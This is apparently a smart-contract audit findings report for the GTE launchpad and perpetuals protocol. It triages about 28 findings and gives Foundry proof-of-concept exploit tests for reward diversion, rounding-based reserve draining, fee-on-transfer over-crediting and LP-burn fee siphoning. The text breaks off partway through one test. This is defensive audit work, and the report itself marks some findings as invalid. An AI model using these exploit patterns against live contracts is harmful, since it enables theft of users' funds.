# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

## Protocol Overview 

### GTE Protocol – High-performance Launchpad & Perps CLOB

GTE unifies token launches, AMM liquidity, and a central-limit order-book (CLOB) for spot + perpetuals on the MegaETH L2.

1. **Launchpad**
   • Deploys a new ERC20 *LaunchToken*, selling 80 % via a **SimpleBondingCurve**. Quote payments stay in Launchpad; bought tokens are locked as *bonding shares* until `unlock()`.  
   • When curve supply empties, Launchpad auto-creates a Uniswap-V2 pair through **GTELaunchpadV2PairFactory**, seeds it with the remaining 20 % supply, and locks LP tokens in **LaunchpadLPVault**.  
   • Swap fees (0.1 %) stream to **Distributor**, which also pays staking rewards tracked by *RewardsTracker*.

2. **Perpetual CLOB**
   • Users deposit USDC into the ERC-4626 **GTL** vault; shares represent pro-rata claim.  
   • **PerpManager** holds vault USDC as collateral, lets traders (or whitelisted operators) post margin, set leverage, and manage orders on-chain.  
   • Risk is controlled by **LiquidatorPanel** (forced closes) and **InsuranceFund**; admins can pause via **AdminPanel**.  
   • Withdrawals are request-queued and batch-executed by vault admins, preventing griefing while keeping the system solvent.

3. **Security & Trust**
   • Owner roles grant admin/operator rights; withdrawal admin can stall exits, and Launchpad owner can change curve/fees.  
   • No contract can arbitrary seize user balances; all funds move through explicit, role-checked paths.##Findings by Pattern


 **Derived From** : Stake reward payouts sent to msg.sender (Launchpad) instead of the user

[M-1]. Distributor.increaseStake diverts user rewards to Launchpad via msg.sender, breaking pending rewards accounting - OUT OF SCOPE



 **Derived From** : reserves[token].quoteReserve_post * reserves[token].baseReserve_post >= reserves[token].quoteReserve_pre * reserves[token].baseReserve_pre

[H-2]. Split-buys exploit: 0-quote micro buys + single sell drains Launchpad via integer rounding in SimpleBondingCurve.sell/buy - INVALID exploit off internal function that is guarded when called
[H-3]. Free-buy due to floor rounding lets attacker acquire base for 0 quote; later sells extract quote (rounding asymmetry in constant-product) - INVALID exploit off internal function that is guarded when called

*NOTE* - have the app only look at exploits from external/public entry points? And provide any callers?


 **Derived From** : Free collateral credited using requested amount, ignores fee-on-transfer delta

[M-4]. depositFreeCollateral over-credits freeCollateral for fee-on-transfer/rebasing USDC, breaking solvency and causing withdrawals to revert



********************************************************************************
 **Derived From** : IERC20(token0).balanceOf(address(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

[H-5]. LP burn can siphon pending launchpad fees before distribution, draining pool on next _update  - **LEGIT**
********************************************************************************


 **Derived From** : FOT/rebasing quote breaks slippage guarantee in sell(); user underpaid

[M-6]. Launchpad.sell assumes 1:1 ERC20 transfer; FOT/rebasing quote token causes user to receive less than minAmountOutQuote



 **Derived From** : Accrued fees zeroed before external call lets anyone skim undistributed fees

[H-7]. Skimmable rewards: GTELaunchpadV2Pair._update zeroes accrued fees before distributor pull, making fees permanently stealable via skim() -- **INVALID - could not see AddRewards IR, because file was not in scope , need to fix!**



 **Derived From** : Unbounded withdrawal queue growth leads to storage/gas bloat and liveness risk

[H-8]. Unbounded _withdrawalQueue enables permissionless gas-DoS; O(N) array rewrites in cancelWithdrawal/processWithdrawals brick withdrawals -- **LEGIT**



 **Derived From** : Floor rounding undercharges quote on buy(); missing ceil enables penny‑shaving

[L-9]. Penny-shaving on buys: floor rounding in SimpleBondingCurve._getQuoteAmount undercharges quote; micro-buys yield profit



 **Derived From** : cancelWithdrawal rebuilds queue with O(N) copy per call

[H-10]. Unbounded O(N) array rebuild in GTL.cancelWithdrawal enables gas-based DoS on cancels -- **LEGIT**



 **Derived From** : Distributor callback can revert and DoS swaps/mints (no fallback accrual path)

[H-11]. Pool-wide DoS: unguarded rewards callback in GTELaunchpadV2Pair._distributeLaunchpadFees bricks swap/mint/burn -- **INVALID REQUIRES TRUSTED ROLE - LOW/INFORMATIONAL**



 **Derived From** : Owner/roles never initialized in LiquidatorPanel (OwnableRoles)

[H-12]. Uninitialized owner/roles in LiquidatorPanel bricks all liquidation/deleverage entrypoints, risking system solvency



 **Derived From** : Permissionless createPair lets anyone block Launchpad parameters

[M-13]. Front‑running createPair cements zeroed launchpad params and prevents legitimate pair, permanently breaking fee routing



 **Derived From** : (balance0 * 1000 - amount0In * 3) * (balance1 * 1000 - amount1In * 3) >= uint256(_reserve0) * uint256(_reserve1) * 1000**2

[H-14]. Zero-input theft of accrued launchpad fees by exploiting reserves–balances desync in GTELaunchpadV2Pair.swap



 **Derived From** : freeCollateral_after(account) + margin_after(account,subaccount) == freeCollateral_before(account) + margin_before(account,subaccount) - fundingPayment_before

[H-15]. removeMargin re-realizes the same funding indefinitely due to setPositions gating, enabling infinite balance inflation and USDC drain



 **Derived From** : Rounding dust in backstop fee allocation leaks value over time

[M-16]. Backstop fee split floors per-recipient, leaving unassigned remainder that breaks accounting invariants -> OUT OF SCOPE



 **Derived From** : Division-by-zero in backstop fee split when totals are zero

[M-17]. Backstop liquidation DoS: division-by-zero in LiquidatorPanel._settleBackstopLiquidation when totalPoints or totalVolume is zero -> OUT OF SCOPE



 **Derived From** : processWithdrawals slices full queue (O(N)) causing gas-based DoS

[H-18]. GTL.processWithdrawals does O(N) copy of withdrawal queue tail; attackers can bloat queue to brick withdrawals (gas DoS)



 **Derived From** : For any shares <= totalSupply(): _convertToAssets(shares, allocatedAssets) <= usdc.balanceOf(address(this)) + allocatedAssets

[M-19]. processWithdrawals DoS: _convertToAssets uses off-vault allocatedAssets causing assets > on-chain USDC and revert



 **Derived From** : For rs.quoteAsset = q: baseAmount <= pre.totalPendingRewards[launchAsset] && quoteAmount <= pre.totalPendingRewards[q]

[H-20]. Overflow in rewards accrual math bricks Distributor.claimRewards (pendingRewards * PRECISION overflows uint128)
[M-21]. Fee-on-transfer/rebasing tokens desync totalPendingRewards vs actual balance, causing claimRewards to revert (DoS)



 **Derived From** : Operator funds debited due to msg.sender/account mismatch in graduation swap

[H-22]. Graduation exact-out swap charges operator/gteRouter (msg.sender) instead of user in Launchpad._swapRemaining-> OUT OF SCOPE



 **Derived From** : _swapRemaining assumes exact token amounts; FOT tokens cause refund/DoS mismatch

[M-23]. Fee-on-transfer quote breaks refund in Launchpad._swapRemaining, causing buy() DoS during graduation



 **Derived From** : addRewards over-credits pending on fee-on-transfer tokens

[M-24]. Distributor.addRewards credits rewards before pulling tokens; fee-on-transfer/rebasing tokens brick claims (DoS)



 **Derived From** : addRewards accepts arbitrary quote token, desyncing pool vs payout token

[M-25]. Distributor.addRewards accepts arbitrary quote token, corrupts totalPending mapping and DoS’s reward claims



 **Derived From** : Router/Pair wrongly accrue bonding shares and rewards during lock

[M-26]. Infrastructure addresses (router/pair) get staking credit during bonding, inflating totalFeeShare and diluting user rewards-> OUT OF SCOPE



 **Derived From** : unlocked => totalFeeShare_post <= totalFeeShare_pre and bondingShare[to]_post == bondingShare[to]_pre

[M-27]. Rewards closure DoS: endRewards is permanently unreachable after unlock even when totalFeeShare drains to zero



 **Derived From** : Payouts assume exact transfer; users shorted on taxed tokens

[H-28]. Distributor._distributeAssets silently short-pays claimants when reward token is fee-on-transfer; accounting decremented by full amount


### Number of Findings
- C: 0
- H: 14
- M: 13
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Stake reward payouts sent to msg.sender (Launchpad) instead of the user

## [M-1]. Distributor.increaseStake diverts user rewards to Launchpad via msg.sender, breaking pending rewards accounting

## Derived From Pattern/Invariant
Stake reward payouts sent to msg.sender (Launchpad) instead of the user

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake

## Minimim Privilege Required
RequiresRole

## Description
Distributor.increaseStake computes rewards owed to `account` via RewardsTrackerLib.stake, but then calls _distributeAssets which transfers tokens to msg.sender (the Launchpad) instead of to `account`. User reward debts are advanced, and totalPendingRewards is decremented, so users cannot later claim the amounts already paid to Launchpad. This violates conservation between pending accounting and balances and causes silent reward theft from users. Vulnerable snippet: function increaseStake(address launchAsset, address account, uint96 shares){ (baseAmount, quoteAmount) = rs.stake(account, shares); _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount); } function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount){ if (baseAmount > 0){ _decreaseTotalPending(base, baseAmount); base.safeTransfer(msg.sender, baseAmount); } if (quoteAmount > 0){ _decreaseTotalPending(quote, quoteAmount); quote.safeTransfer(msg.sender, quoteAmount); } }

## Impact
Rewards owed to users are paid to Launchpad and deducted from totalPendingRewards, while users’ debts are updated. Users cannot reclaim diverted rewards; requires admin repair/top-up.

## Proof of Concept
1) Launchpad creates a rewards pair and stakes shares for Alice. 2) Third party funds rewards via addRewards. 3) Launchpad calls increaseStake again; rs.stake computes Alice’s accrued rewards, but _distributeAssets sends them to msg.sender (Launchpad) and decrements totalPendingRewards. 4) Alice calls claimRewards and gets 0, since her debt was updated and the rewards were already paid to Launchpad.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

/* --------------------------------------------------------------
 * Minimal reproducible environment
 * ------------------------------------------------------------*/
contract MockERC20 {
    using SafeTransferLib for address;
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s){ name=n; symbol=s; }
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; }
    function approve(address sp, uint256 amt) external returns(bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to, uint256 amt) external returns(bool){ balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){
        uint256 l=allowance[f][msg.sender];
        if(l!=type(uint256).max){ allowance[f][msg.sender]=l-a; }
        balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

/* --------------------------------------------------------------
 *  Distributor stub that shows the bug (rewards -> msg.sender)
 * ------------------------------------------------------------*/
contract BuggyDistributor {
    using SafeTransferLib for address;
    mapping(address => uint256) public totalPendingRewards;
    address public immutable launchpad;
    constructor(address lp){ launchpad = lp; }

    function addRewards(address asset, uint256 amount) external {
        asset.safeTransferFrom(msg.sender, address(this), amount);
        totalPendingRewards[asset] += amount;
    }

    // identical signature to prod code, but shares logic omitted for brevity
    function increaseStake(address asset, address /*account*/, uint96 /*shares*/) external {
        require(msg.sender == launchpad, "only LP");
        uint256 payout = totalPendingRewards[asset];
        if(payout>0){
            totalPendingRewards[asset] = 0;           // accounting advanced
            asset.safeTransfer(msg.sender, payout);   // BUT money goes to LP
        }
    }

    function claimRewards(address asset) external returns (uint256){
        // user sees nothing left
        return 0;
    }
}

/* --------------------------------------------------------------
 *  Exploit test
 * ------------------------------------------------------------*/
contract DistributorBugTest is Test {
    MockERC20 reward;
    BuggyDistributor dist;
    address launchpad = address(0xBEEF);
    address alice     = address(0xA11CE);

    function setUp() public {
        reward = new MockERC20("R","R");
        dist   = new BuggyDistributor(launchpad);

        // seed distributor with rewards
        reward.mint(address(this), 100 ether);
        reward.approve(address(dist), type(uint256).max);
        dist.addRewards(address(reward), 100 ether);
        assertEq(dist.totalPendingRewards(address(reward)), 100 ether);
    }

    function test_Launchpad_steals_rewards_on_increaseStake() public {
        // launchpad calls increaseStake for Alice
        vm.prank(launchpad);
        dist.increaseStake(address(reward), alice, 1);

        // rewards have been sent to launchpad, not Alice
        assertEq(reward.balanceOf(launchpad), 100 ether);
        assertEq(reward.balanceOf(alice), 0);

        // accounting shows nothing left to claim
        assertEq(dist.totalPendingRewards(address(reward)), 0);
    }
}

## Suggested Mitigation
Introduce an internal helper that takes an explicit recipient and use it for stake/unstake flows.

function _distribute(address recipient, address base, uint256 baseAmt, address quote, uint256 quoteAmt) internal {
    if (baseAmt > 0) { _decreaseTotalPending(base, baseAmt); base.safeTransfer(recipient, baseAmt); }
    if (quoteAmt > 0) { _decreaseTotalPending(quote, quoteAmt); quote.safeTransfer(recipient, quoteAmt); }
}

// in increaseStake / decreaseStake
_distribute(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);

// keep claimRewards behaviour unchanged
_distribute(msg.sender, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);





 **Derived From** : reserves[token].quoteReserve_post * reserves[token].baseReserve_post >= reserves[token].quoteReserve_pre * reserves[token].baseReserve_pre

## [H-2]. Split-buys exploit: 0-quote micro buys + single sell drains Launchpad via integer rounding in SimpleBondingCurve.sell/buy

## Derived From Pattern/Invariant
reserves[token].quoteReserve_post * reserves[token].baseReserve_post >= reserves[token].quoteReserve_pre * reserves[token].baseReserve_pre

## Exploit Type
RoundingError

## Location
SimpleBondingCurve.sell

## Minimim Privilege Required
Permissionless

## Description
The curve uses integer division with floor to compute quoteAmount: sell uses quoteAmount = (q * Δb) / (b + Δb) and buy uses quoteAmount = (q * Δb) / (b - Δb). Per the invariant, each sell never decreases k, but buys do decrease k due to flooring. An attacker splits a desired purchase into many tiny baseAmount buys where (q * Δb) / (b - Δb) floors to 0, paying 0 quote while reducing baseReserve. They then perform a single large sell, incurring the sell-floor rounding only once, extracting positive quote. This exploits rounding asymmetry and is amplified by decimals mismatch (e.g., 18-decimal base vs 6-decimal quote), enabling near-free accumulation of base and profitable redemption. Vulnerable snippet:

function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy) internal pure returns (uint256 quoteAmount) {
    uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount;
    return (quoteReserve * baseAmount) / baseReserveAfter; // floor on both paths
}

In buy(), quote rounding down undercharges; in sell(), rounding down overcharges the user, but only once if the attacker aggregates sells, yielding net profit.

## Impact
Attacker can drain quote reserves held by Launchpad by making many free/undercharged buys and one aggregated sell, causing direct monetary loss. Also skews supply/accounting (e.g., baseSoldFromCurve) and can prematurely exhaust bonding supply.

## Proof of Concept
1) Initialize curve with reserves (q=1000, b=2000). 2) Perform 100 buys of baseAmount=1; each costs 0 quote due to floor((1000*1)/(b-1))=0 while b decrements to 1900. 3) Perform a single sell of 100 base; quoteAmount=floor((1000*100)/(1900+100))=50. 4) Net quote paid=0, quote received=50 => profit. The sell invariant holds per-step, but overall k decreased across buy phase, enabling extraction on sell.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";

contract RoundingSplitExploitTest is Test {
    SimpleBondingCurve curve;
    address launchpad = address(0xBEEF);
    address token = address(0xCAFE);

    function setUp() public {
        curve = new SimpleBondingCurve(launchpad);
        vm.startPrank(launchpad);
        curve.init(abi.encode(uint256(1000), uint256(1000))); // VIRTUAL_BASE=1000, VIRTUAL_QUOTE=1000
        curve.initializeCurve(token, 3000, 1000); // totalSupply=3000, bondingSupply=1000 => initial b=2000, q=1000
        vm.stopPrank();
    }

    function test_splitBuysThenSingleSell_DrainsQuoteDueToRounding() public {
        (uint256 q0, uint256 b0) = curve.getReserves(token);
        assertEq(q0, 1000, "q0");
        assertEq(b0, 2000, "b0");

        vm.startPrank(launchpad);
        uint256 totalQuotePaid;
        for (uint256 i = 0; i < 100; i++) {
            uint256 q = curve.buy(token, 1); // baseAmount=1
            totalQuotePaid += q;
            assertEq(q, 0, "micro buy should cost 0 quote due to floor");
        }
        (uint256 q1, uint256 b1) = curve.getReserves(token);
        assertEq(q1, 1000, "quote unchanged after free buys");
        assertEq(b1, 1900, "base decreased by 100");

        uint256 quoteReceived = curve.sell(token, 100); // aggregate sell
        vm.stopPrank();
        assertEq(quoteReceived, 50, "single sell returns positive quote");
        assertGt(quoteReceived, totalQuotePaid, "attacker nets profit");

        // Check k decreased across cycle (not a revert, but shows value extraction)
        (uint256 q2, uint256 b2) = curve.getReserves(token);
        assertEq(q2, 950);
        assertEq(b2, 2000);
        assertEq(q0 * b0, 2_000_000);
        assertEq(q2 * b2, 1_900_000);
    }
}


## Suggested Mitigation
Eliminate rounding arbitrage by rounding UP for buy inputs and DOWN for sell outputs. In _getQuoteAmount: if isBuy, compute quoteAmount using ceilDiv((quoteReserve * baseAmount), (baseReserve - baseAmount)); if !isBuy, keep floor. Similarly, in _getBaseAmount, round base out down for buys and up for sells to maintain no-free-lunch symmetry. Additionally, enforce minimal trade sizes (e.g., require(quoteAmount > 0) on buys) and consider scaling reserves by token decimals to reduce precision gaps.


## [H-3]. Free-buy due to floor rounding lets attacker acquire base for 0 quote; later sells extract quote (rounding asymmetry in constant-product)

## Derived From Pattern/Invariant
reserves[token].quoteReserve_post * reserves[token].baseReserve_post >= reserves[token].quoteReserve_pre * reserves[token].baseReserve_pre

## Exploit Type
RoundingError

## Location
SimpleBondingCurve.buy

## Minimim Privilege Required
Permissionless

## Description
The curve computes quoteAmount with floor in both directions. For sells, this preserves k monotonicity (k_post >= k_pre), but for buys it reduces k because buy uses quoteAmount = floor(q * Δb / (b - Δb)). When Δb < b/(q+1), floor returns 0, allowing a user to buy nonzero base for zero quote. The reserves are still updated (r.baseReserve -= Δb; r.quoteReserve += 0), giving the attacker free base. Repeating two or more such zero-cost buys and then selling the accumulated base back yields a positive quoteAmount from sell: quoteOut ≈ floor(q * ΣΔb / (b' + ΣΔb)) ≥ 1, directly draining quote from the Launchpad. Vulnerable snippet: function _getQuoteAmount(..., bool isBuy) { uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount; return (quoteReserve * baseAmount) / baseReserveAfter; } // floor causes 0-cost buy when baseAmount < baseReserve/(quoteReserve+1).

## Impact
Any user can purchase small chunks of the newly-launched token for zero quote by exploiting floor-rounding in the buy path. They can later sell the accumulated base back to the curve for a positive quote payout, extracting the Launchpad’s quote reserves. The loss is permanent, limited only by the bonding-supply remaining in the curve, so the quote pool can be fully drained.

## Proof of Concept
1. Let q, b be the current quote and base reserves held by the bonding curve for token T.
2. Choose a buy size Δb = (b / (q + 1)) − 1 (guaranteed ≥ 1 when b ≫ q).
3. Call Launchpad.buyToken{value:0}(T, Δb).  The Launchpad queries curve.quoteQuoteForBase(…, true) which returns 0, so it transfers 0 quote from the caller yet still releases Δb base to the caller.
4. Repeat step-3 until a desired amount Bfree has been collected (no quote was ever paid).
5. Call Launchpad.sellToken(T, Bfree).  In the sell path rounding works in the attacker’s favour and curve.sell returns quoteOut ≥ 1.  The Launchpad transfers quoteOut units of the quote token to the attacker.
6. Loop steps 2-5 until the bonding-supply is exhausted; each cycle irreversibly transfers quote reserves from the Launchpad to the attacker while giving away base for free.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";

contract LaunchpadStub {
    SimpleBondingCurve public curve;
    constructor(SimpleBondingCurve _curve) { curve = _curve; }

    function buyToken(address token, uint256 baseAmt) external {
        uint256 quoteIn = curve.buy(token, baseAmt); // forwards call
        // Normally the real Launchpad would transfer quoteIn from msg.sender; we skip because quoteIn will be 0 in the exploit
    }

    function sellToken(address token, uint256 baseAmt) external {
        uint256 quoteOut = curve.sell(token, baseAmt);
        // In real Launchpad, quoteOut would be sent to msg.sender; we ignore bookkeeping for brevity
        // send quoteOut to caller to simulate proceeds
        payable(msg.sender).transfer(quoteOut);
    }
}

contract FreeBuyRounding_Test is Test {
    SimpleBondingCurve curve;
    LaunchpadStub lp;
    address token = address(0xAAA1);

    function setUp() public {
        curve = new SimpleBondingCurve(address(1)); // placeholder launchpad address
        vm.prank(address(1));
        curve.init(abi.encode(uint256(1e18), uint256(1_000_000))); // virtual reserves
        vm.prank(address(1));
        curve.initializeCurve(token, 1_000_000 ether, 800_000 ether);
        lp = new LaunchpadStub(curve);
    }

    function test_freeBuyThenSell() public {
        (uint256 q0, uint256 b0) = curve.getReserves(token);
        uint256 baseAmt = (b0 / (q0 + 1)) - 1;
        vm.startPrank(address(1234));
        lp.buyToken(token, baseAmt); // costs 0 quote
        lp.buyToken(token, baseAmt); // another free buy
        (uint256 q1, uint256 b1) = curve.getReserves(token);
        uint256 gainedBase = (b0 - b1);
        lp.sellToken(token, gainedBase); // extracts positive quote
        vm.stopPrank();
        // Test passes if contract balance increased
        assertGt(address(1234).balance, 0, "Attacker gained quote");
    }
}

## Suggested Mitigation
Calculate quoteAmount with ceiling rounding on the buy path so that quoteAmount ≥ 1 whenever baseAmount > 0:  quoteAmount = (quoteReserve * baseAmount + baseReserveAfter − 1) / baseReserveAfter;  alternatively add `require(quoteAmount > 0)` in buy() to forbid zero-cost trades.





 **Derived From** : Free collateral credited using requested amount, ignores fee-on-transfer delta

## [M-4]. depositFreeCollateral over-credits freeCollateral for fee-on-transfer/rebasing USDC, breaking solvency and causing withdrawals to revert

## Derived From Pattern/Invariant
Free collateral credited using requested amount, ignores fee-on-transfer delta

## Exploit Type
FeeOnTransferAssumption

## Location
CollateralManagerLib.depositFreeCollateral

## Minimim Privilege Required
Permissionless

## Description
CollateralManagerLib.depositFreeCollateral transfers USDC using USDC.safeTransferFrom(from, address(this), amount) and then unconditionally credits self.creditAccount(to, amount). If USDC is fee-on-transfer/rebasing or otherwise transfers less than requested, the contract receives <amount while crediting =amount. This inflates ledger balances vs. real tokens, violates the stated solvency invariant (sum freeCollateral + sum margin + insurance == USDC balance), and eventually causes withdrawals/debits to revert for lack of funds. Vulnerable snippet:

function depositFreeCollateral(...) {
    USDC.safeTransferFrom(from, address(this), amount);
    self.creditAccount(to, amount); // credits 'amount' without balance delta check
}

Any EOA can trigger this via PerpManager.depositTo or deposit, resulting in persistent accounting skew until admins repair state.

## Impact
Any token that transfers fewer units than requested (fee-on-transfer, deflationary, or rebasing) will cause the contract to over-credit user freeCollateral. The accounting deficit accumulates until real USDC balance < summed liabilities, making subsequent withdrawals revert. Funds are not directly stolen but become unreachable without an emergency top-up or state migration, i.e. protocol-level DoS that requires admin action.

## Proof of Concept
- Attacker uses a USDC that charges a 10% transfer fee (or any deflationary/rebasing behavior).
- Calls depositTo(account=attacker, amount=1,000,000). Contract receives only 900,000 but credits freeCollateral[attacker]+=1,000,000.
- Invariant breaks: freeCollateral sum > USDC balance.
- Attacker (or any user later) can only withdraw up to the real token balance remaining; attempts to withdraw their credited remainder revert due to insufficient USDC. This creates a reproducible DoS window for withdrawals and misstates solvency until an admin fixes it.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";

contract FeeOnTransferUSDC is IERC20 {
    string public name = "FOT USDC";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;

    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    uint256 public feeBps = 1000; // 10%

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        uint256 fee = (amount * feeBps) / 10_000;
        uint256 send = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += send;
        balanceOf[address(0xdead)] += fee; // burn/sink
        emit Transfer(from, to, send);
        emit Transfer(from, address(0xdead), fee);
    }
}

// Minimal harness mirroring the vulnerable pattern of CollateralManagerLib.depositFreeCollateral
contract CollateralHarness {
    using SafeTransferLib for address;

    address public immutable usdc;
    mapping(address => uint256) public freeCollateral;

    constructor(address _usdc) { usdc = _usdc; }

    // Vulnerable: credits the requested 'amount' rather than the post-transfer balance delta
    function depositFreeCollateral(address from, address to, uint256 amount) external {
        SafeTransferLib.safeTransferFrom(usdc, from, address(this), amount);
        freeCollateral[to] += amount; // over-credits if token is FOT/rebasing
    }

    function withdrawFreeCollateral(address account, uint256 amount) external {
        require(freeCollateral[account] >= amount, "InsufficientBalance");
        freeCollateral[account] -= amount;
        SafeTransferLib.safeTransfer(usdc, account, amount); // will revert when contract lacks real tokens
    }

    function tokenBalance() external view returns (uint256) {
        return IERC20(usdc).balanceOf(address(this));
    }
}

contract FeeOnTransferAssumptionTest is Test {
    FeeOnTransferUSDC usdc;
    CollateralHarness cm;
    address attacker = address(0xA11CE);

    function setUp() public {
        usdc = new FeeOnTransferUSDC();
        cm = new CollateralHarness(address(usdc));
        usdc.mint(attacker, 1_000_000e6);
        vm.prank(attacker);
        usdc.approve(address(cm), type(uint256).max);
    }

    function test_overcredit_breaks_solvency_and_reverts_withdrawals() public {
        // Attacker deposits 1,000,000 USDC; 10% fee -> only 900,000 received
        vm.prank(attacker);
        cm.depositFreeCollateral(attacker, attacker, 1_000_000e6);

        // Ledger credited with full amount, but contract received less
        assertEq(cm.freeCollateral(attacker), 1_000_000e6, "ledger over-credited");
        assertEq(usdc.balanceOf(address(cm)), 900_000e6, "token balance reflects net receipt");

        // Withdraw up to the real balance succeeds
        vm.prank(attacker);
        cm.withdrawFreeCollateral(attacker, 900_000e6);
        assertEq(usdc.balanceOf(address(cm)), 0);

        // Remaining credited 100,000 cannot be withdrawn -> revert (insufficient real USDC)
        vm.startPrank(attacker);
        vm.expectRevert();
        cm.withdrawFreeCollateral(attacker, 100_000e6);
        vm.stopPrank();
    }
}


## Suggested Mitigation
- In deposit paths, credit based on the actual balance delta, not the requested amount:
  uint256 b0 = IERC20(USDC).balanceOf(address(this));
  SafeTransferLib.safeTransferFrom(USDC, from, address(this), amount);
  uint256 received = IERC20(USDC).balanceOf(address(this)) - b0;
  if (received != amount) revert InvalidAssetTransfer(); // or credit 'received' if supporting FOT
  self.creditAccount(to, received);

- Apply the same balance-delta check (or revert) for depositFromSpot as well.
- Optionally hard-block nonstandard tokens by asserting received == amount to preserve invariants, since supporting FOT on withdraw is impractical.
- Document the assumption that USDC must be a standard 1:1 ERC20 without transfer fees or rebases.





 **Derived From** : IERC20(token0).balanceOf(address(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

## [H-5]. LP burn can siphon pending launchpad fees before distribution, draining pool on next _update

## Derived From Pattern/Invariant
IERC20(token0).balanceOf(address(this)) == uint256(reserve0) + uint256(accruedLaunchpadFee0) && IERC20(token1).balanceOf(address(this)) == uint256(reserve1) + uint256(accruedLaunchpadFee1)

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.burn

## Minimim Privilege Required
Permissionless

## Description
In burn(), redemption amounts are computed from full on-chain balances (balance0/balance1), which include the undistributed launchpad fees sitting in the pair. Those fees are meant to be withheld and forwarded to the Distributor, and reserves are stored net-of-fees later in _update via reserve = uint112(balance) - (accrued+new). As a result, an LP burner receives their pro-rata share of the pending launchpad fees immediately, and then, when _update later distributes fees (timeElapsed > 0 branch), the pair transfers the full previously accrued amount to the Distributor. Because reserves were reduced by the full fee while some of those tokens were already paid out to the burner, the distribution comes at the expense of the remaining liquidity (pool reserves). This enables a profit-making cycle for an unprivileged attacker who: (1) accumulates large pending fees via swaps, (2) transfers LP to the pair and burns to capture a pro-rata share of those fees from balances, then (3) lets anyone trigger an _update with timeElapsed > 0 to distribute the same fees again, effectively double-paying the fee once to the burner and once to the Distributor by debiting liquidity. Vulnerable snippet: burn() computes amount0/amount1 using balances, not net-of-fee balances or reserves: amount0 = liquidity.mul(balance0) / _totalSupply; amount1 = liquidity.mul(balance1) / _totalSupply; Later _update subtracts totalLaunchpadFee from balances: reserve0 = uint112(balance0) - totalLaunchpadFee0; reserve1 = uint112(balance1) - totalLaunchpadFee1; making the final fee distribution pull from remaining reserves.

## Impact
By burning LP before the pending launchpad fees are distributed, an attacker can withdraw a pro-rata share of those fees. The subsequent fee-distribution transaction still transfers the full fee amount to the Distributor, debiting the pair’s balances while reserves remain unchanged. The pool therefore pays the same fees twice: once to the attacker and once to the Distributor. The discrepancy permanently steals value from the remaining liquidity providers and distorts pool pricing, constituting a direct, permissionless loss of funds.

## Proof of Concept
1. Swappers build up `accruedLaunchpadFee{0,1}` in the pair.
2. Attacker sends her LP tokens to the pair and calls `burn()`. Because `amount{0,1}` are calculated from the raw on-chain balances, she immediately receives her percentage of the still-undistributed fees.
3. Nothing in `burn()` touches `accruedLaunchpadFee{0,1}`, so they are still recorded in storage.
4. In the next block anyone calls `sync()` (or any function that reaches `_update` with `timeElapsed > 0`). `_update`:
   • deletes `accruedLaunchpadFee{0,1}`
   • transfers the ENTIRE pre-burn fee amounts to the external `Distributor` contract
   • records reserves as if the pair still held those tokens (it calculated reserves *before* the pull)
5. Result: total tokens paid out = attacker-share + 100 % of fees. The excess is taken from the pool reserves, permanently harming the remaining LPs while the attacker captures risk-free value.

## Proof of Code
pragma solidity 0.8.17;
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract TestERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt;}
